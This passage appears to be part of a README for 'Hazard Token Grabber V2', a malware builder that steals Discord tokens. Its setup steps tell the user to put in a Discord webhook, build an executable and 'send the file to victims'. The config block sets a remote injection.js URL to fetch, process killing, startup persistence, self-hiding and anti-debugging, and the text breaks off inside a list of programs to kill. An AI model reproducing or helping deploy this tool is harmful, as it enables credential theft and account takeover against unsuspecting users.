## <a id="setup"></a> 📁 〢 Setting up Hazard Token Grabber.V2

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

## <a id="config"></a>⚙ 〢 Config

If you Want to change the config, open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted

    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
